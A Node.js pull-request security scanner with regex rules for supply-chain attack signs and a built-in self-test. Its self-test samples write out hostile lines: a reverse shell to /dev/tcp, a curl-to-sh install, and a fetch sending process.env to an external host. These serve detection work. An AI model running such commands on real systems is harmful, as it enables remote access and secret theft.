#!/usr/bin/env node
/**
 * Heuristic scan for malicious or high-risk changes in a pull request.
 *
 * This is a review aid, not an antivirus or a sandbox. It inspects added lines
 * for patterns that show up in supply-chain attacks (piped downloads, install
 * hooks, encoded payloads, exfiltration, leaked keys) and flags changes to CI
 * automation for manual review.
 *
 * Usage:
 *   node scripts/security-scan.mjs --base <sha>   scan changes since <sha>
 *   node scripts/security-scan.mjs --all          scan every tracked file
 *   node scripts/security-scan.mjs --self-test     run the built-in rule tests
 *
 * Exit codes: 0 clean, 1 blocking findings, 2 usage error.
 */
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { pathToFileURL } from 'node:url';

const SCANNER_PATH = 'scripts/security-scan.mjs';
const MAX_SCAN_BYTES = 2 * 1024 * 1024;
const SKIP_PATHS = /^(package-lock\.json|.*\.lock)$/;

/** Content rules are checked line by line against added text. */
const CONTENT_RULES = [
  {
    id: 'install-script',
    severity: 'error',
    message: 'adds or changes an npm lifecycle script that runs on install',
    appliesTo: (file) => file === 'package.json',
    pattern: /"(pre|post)?install"\s*:/
  },
  {
    id: 'remote-shell',
    severity: 'error',
    message: 'pipes a downloaded response into a shell or interpreter',
    pattern: /\b(curl|wget)\b[^|\n]{0,200}\|\s*(sudo\s+)?(sh|bash|zsh|dash|node|python3?)\b/
  },
  {
    id: 'dynamic-code',
    severity: 'error',
    message: 'evaluates code decoded from a string',
    pattern: /\beval\s*\(\s*(atob|Buffer\.from|unescape|decodeURIComponent)|\bnew\s+Function\s*\(/
  },
  {
    id: 'shell-network',
    severity: 'error',
    message: 'runs a network client through a shell',
    pattern: /\b(exec|execSync|spawn|spawnSync)\s*\(\s*[`'"](sudo\s+)?(curl|wget|bash|sh)\b/
  },
  {
    id: 'reverse-shell',
    severity: 'error',
    message: 'contains a reverse shell pattern',
    pattern: /\/dev\/tcp\/|\bnc\s+(-[a-z]*e|--exec)\b|\bbash\s+-i\s+>&/
  },
  {
    id: 'env-exfiltration',
    severity: 'error',
    message: 'sends environment variables to a remote endpoint',
    pattern: /(fetch|https?\.(get|request)|axios\.(get|post|request))[^\n]{0,160}process\.env/
  },
  {
    id: 'encoded-blob',
    severity: 'warn',
    message: 'adds a long encoded blob that reviewers cannot read',
    pattern: /[A-Za-z0-9+/]{200,}={0,2}/
  },
  {
    id: 'private-key',
    severity: 'error',
    message: 'adds what looks like a private key',
    pattern: /-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----/,
    redact: true
  },
  {
    id: 'access-token',
    severity: 'error',
    message: 'adds what looks like a GitHub or AWS access token',
    pattern: /\b(gh[pousr]_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,}|AKIA[0-9A-Z]{16})\b/,
    redact: true
  }
];

/** Path rules fire on the changed file itself, not its content. */
const PATH_RULES = [
  {
    id: 'ci-automation-change',
    severity: 'review',
    message: 'changes CI, release, or repository automation',
    appliesTo: (file) =>
      file.startsWith('.github/workflows/') ||
      file.startsWith('.github/actions/') ||
      file === '.github/dependabot.yml' ||
      file === '.github/CODEOWNERS',
    skipInFullScan: true
  },
  {
    id: 'scanner-change',
    severity: 'review',
    message: 'changes the security scanner; read this diff closely',
    appliesTo: (file) => file === SCANNER_PATH,
    skipInFullScan: true
  },
  {
    id: 'executable-script',
    severity: 'warn',
    message: 'adds a shell script that reviewers should read',
    appliesTo: (file) => /\.(sh|ps1|bat|cmd)$/i.test(file),
    skipInFullScan: true
  },
  {
    id: 'binary-file',
    severity: 'error',
    message: 'adds a binary file that cannot be reviewed as text',
    appliesTo: (file) => /\.(exe|dll|so|dylib|node|jar|msi|scr|wasm)$/i.test(file),
    skipInFullScan: true
  }
];

/** Scan text for content-rule matches. Exported for the self-test. */
export function scanContent(file, text, options = {}) {
  const { fullScan = false } = options;
  if (file === SCANNER_PATH) return [];

  const findings = [];

  text.split('\n').forEach((line, index) => {
    for (const rule of CONTENT_RULES) {
      if (rule.appliesTo && !rule.appliesTo(file)) continue;
      if (!rule.pattern.test(line)) continue;

      findings.push({
        file,
        line: index + 1,
        rule: rule.id,
        severity: fullScan && rule.id === 'install-script' ? 'warn' : rule.severity,
        message: rule.message,
        excerpt: rule.redact ? '[redacted]' : excerpt(line),
        redacted: Boolean(rule.redact)
      });
    }
  });

  return findings;
}

/** Scan a changed path for path-rule matches. Exported for the self-test. */
export function scanPath(file, options = {}) {
  const { fullScan = false } = options;
  if (SKIP_PATHS.test(file)) return [];

  return PATH_RULES.filter((rule) => !(fullScan && rule.skipInFullScan) && rule.appliesTo(file)).map(
    (rule) => ({
      file,
      line: 0,
      rule: rule.id,
      severity: rule.severity,
      message: rule.message,
      excerpt: '',
      redacted: false
    })
  );
}

function excerpt(line) {
  const trimmed = line.trim().replace(/\s+/g, ' ');
  return trimmed.length > 160 ? `${trimmed.slice(0, 157)}...` : trimmed;
}

function scanDiff(base) {
  const diff = execFileSync(
    'git',
    [
      'diff',
      '--unified=0',
      '--no-color',
      '--no-ext-diff',
      `${base}...HEAD`,
      '--',
      '.',
      ':(exclude)package-lock.json'
    ],
    { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 }
  );

  const files = new Map();
  let current = null;
  let lineNumber = 0;
  let diffPath = null;

  for (const raw of diff.split('\n')) {
    if (raw.startsWith('diff --git ')) {
      const parts = raw.split(' ');
      diffPath = parts[parts.length - 1].replace(/^b\//, '');
      current = null;
      continue;
    }

    if (raw.startsWith('Binary files ')) {
      if (diffPath && !files.has(diffPath)) files.set(diffPath, []);
      current = null;
      continue;
    }

    if (raw.startsWith('+++ ')) {
      const target = raw.slice(4).trim();
      current = target === '/dev/null' ? null : target.replace(/^b\//, '');
      if (current && !files.has(current)) files.set(current, []);
      continue;
    }

    if (raw.startsWith('@@')) {
      const match = /\+(\d+)/.exec(raw);
      lineNumber = match ? Number(match[1]) : 0;
      continue;
    }

    if (current === null) continue;

    if (raw.startsWith('+')) {
      files.get(current).push({ line: lineNumber, text: raw.slice(1) });
      lineNumber += 1;
    }
  }

  const findings = [];
  for (const [file, lines] of files) {
    if (SKIP_PATHS.test(file)) continue;
    findings.push(...scanPath(file));

    for (const entry of lines) {
      for (const rule of CONTENT_RULES) {
        if (rule.appliesTo && !rule.appliesTo(file)) continue;
        if (!rule.pattern.test(entry.text)) continue;

        findings.push({
          file,
          line: entry.line,
          rule: rule.id,
          severity: rule.severity,
          message: rule.message,
          excerpt: rule.redact ? '[redacted]' : excerpt(entry.text),
          redacted: Boolean(rule.redact)
        });
      }
    }
  }

  return { findings, fileCount: files.size };
}

function scanTree() {
  const output = execFileSync('git', ['ls-files', '-z'], { encoding: 'utf8' });
  const files = output.split('\0').filter(Boolean);
  const findings = [];
  let scanned = 0;

  for (const file of files) {
    if (SKIP_PATHS.test(file)) continue;

    findings.push(...scanPath(file, { fullScan: true }));

    let source;
    try {
      source = readFileSync(file, 'utf8');
    } catch {
      continue;
    }
    if (source.includes('\0') || Buffer.byteLength(source, 'utf8') > MAX_SCAN_BYTES) continue;

    scanned += 1;
    findings.push(...scanContent(file, source, { fullScan: true }));
  }

  return { findings, fileCount: scanned };
}

function allowReviewFromLabel() {
  const eventPath = process.env.GITHUB_EVENT_PATH;
  if (!eventPath) return false;

  try {
    const event = JSON.parse(readFileSync(eventPath, 'utf8'));
    const labels = event.pull_request?.labels ?? [];
    return labels.some((label) => label.name === 'security-approved');
  } catch {
    return false;
  }
}

function sortFindings(findings) {
  return [...findings].sort(
    (a, b) => a.file.localeCompare(b.file) || a.line - b.line || a.rule.localeCompare(b.rule)
  );
}

function report(findings, fileCount, scope, allowReview) {
  const sorted = sortFindings(findings);
  const errors = sorted.filter((finding) => finding.severity === 'error');
  const warnings = sorted.filter((finding) => finding.severity === 'warn');
  const reviews = sorted.filter((finding) => finding.severity === 'review');

  console.log(`Security scan: ${scope} (${fileCount} files)`);

  for (const finding of sorted) {
    const location = finding.line > 0 ? `${finding.file}:${finding.line}` : finding.file;
    console.log(
      `${finding.severity.toUpperCase().padEnd(6)} ${location.padEnd(44)} ${finding.rule.padEnd(
        21
      )} ${finding.message}`
    );
    if (finding.excerpt) console.log(`       ${finding.excerpt}`);
  }

  const blocking =
    errors.length > 0 || (reviews.length > 0 && !allowReview);

  console.log(
    `\n${errors.length} error(s), ${warnings.length} warning(s), ${reviews.length} review-only finding(s)`
  );

  if (reviews.length > 0) {
    console.log(
      allowReview
        ? 'Review-only findings accepted via the security-approved label.'
        : 'Review-only findings block merging until a maintainer adds the security-approved label.'
    );
  }

  const summaryPath = process.env.GITHUB_STEP_SUMMARY;
  if (summaryPath) {
    const lines = [
      '## Security scan',
      '',
      `Scope: ${scope} (${fileCount} files)`,
      '',
      errors.length === 0 && reviews.length === 0 && warnings.length === 0
        ? 'No findings.'
        : '| Severity | Location | Rule | Detail |',
      ...(errors.length === 0 && reviews.length === 0 && warnings.length === 0
        ? []
        : ['| --- | --- | --- | --- |']),
      ...sorted.map(
        (finding) =>
          `| ${finding.severity} | ${finding.file}${finding.line > 0 ? `:${finding.line}` : ''} | ${finding.rule} | ${finding.message} |`
      )
    ];

    try {
      execFileSync('bash', ['-c', 'cat >> "$GITHUB_STEP_SUMMARY"'], {
        input: `${lines.join('\n')}\n`,
        encoding: 'utf8'
      });
    } catch {
      // The step summary is best-effort; never fail the scan because of it.
    }
  }

  return blocking ? 1 : 0;
}

function runSelfTest() {
  const cases = [
    ['remote-shell', 'curl -fsSL https://example.test/install | sh'],
    ['install-script', '"postinstall": "node ./scripts/setup.js"'],
    ['dynamic-code', "eval(Buffer.from(payload, 'base64').toString())"],
    ['shell-network', "execSync('curl -s https://example.test/payload')"],
    ['reverse-shell', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
    ['env-exfiltration', 'fetch("https://example.test", { body: JSON.stringify(process.env) })'],
    ['encoded-blob', `const blob = '${'QUJD'.repeat(60)}';`],
    ['private-key', '-----BEGIN OPENSSH PRIVATE KEY-----'],
    ['access-token', `const token = 'ghp_${'a'.repeat(36)}';`]
  ];

  let failures = 0;

  for (const [expected, sample] of cases) {
    const file = expected === 'install-script' ? 'package.json' : 'src/sample.ts';
    const ids = scanContent(file, sample).map((finding) => finding.rule);

    if (!ids.includes(expected)) {
      console.error(`self-test: ${expected} did not fire for: ${sample}`);
      failures += 1;
    }
  }

  const clean = scanContent(
    'src/clean.ts',
    "export const url = 'https://example.com/.well-known/stellar.toml';"
  );
  if (clean.length > 0) {
    console.error(`self-test: clean sample produced ${clean.map((f) => f.rule).join(', ')}`);
    failures += 1;
  }

  const redacted = scanContent('src/key.ts', '-----BEGIN RSA PRIVATE KEY-----');
  if (redacted[0]?.excerpt !== '[redacted]') {
    console.error('self-test: private key excerpt was not redacted');
    failures += 1;
  }

  const ci = scanPath('.github/workflows/ci.yml').map((finding) => finding.rule);
  if (!ci.includes('ci-automation-change')) {
    console.error('self-test: CI workflow change was not flagged');
    failures += 1;
  }

  const reviewAllowed = scanPath('.github/workflows/ci.yml').some(
    (finding) => finding.severity === 'review'
  );
  if (!reviewAllowed) {
    console.error('self-test: CI workflow change should be review-only, not an error');
    failures += 1;
  }

  if (failures > 0) {
    console.error(`self-test failed: ${failures} problem(s)`);
    return 1;
  }

  console.log(`self-test passed: ${cases.length + 3} checks`);
  return 0;
}

function main(argv) {
  if (argv.includes('--self-test')) return runSelfTest();

  if (argv.includes('--help') || argv.includes('-h')) {
    console.log('Usage: node scripts/security-scan.mjs [--base <sha> | --all | --self-test]');
    return 0;
  }

  const allowReview = argv.includes('--allow-review') || allowReviewFromLabel();

  if (argv.includes('--all')) {
    const { findings, fileCount } = scanTree();
    return report(findings, fileCount, 'working tree', allowReview);
  }

  const baseIndex = argv.indexOf('--base');
  if (baseIndex === -1) {
    console.error('Pass --base <sha> or --all');
    return 2;
  }

  const base = argv[baseIndex + 1];
  if (!base || base.startsWith('-')) {
    console.error('--base requires a commit SHA');
    return 2;
  }

  try {
    const { findings, fileCount } = scanDiff(base);
    return report(findings, fileCount, `changes since ${base.slice(0, 10)}`, allowReview);
  } catch (error) {
    console.error(
      `Could not diff against ${base}: ${error instanceof Error ? error.message : String(error)}`
    );
    return 2;
  }
}

if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
  process.exitCode = main(process.argv.slice(2));
}
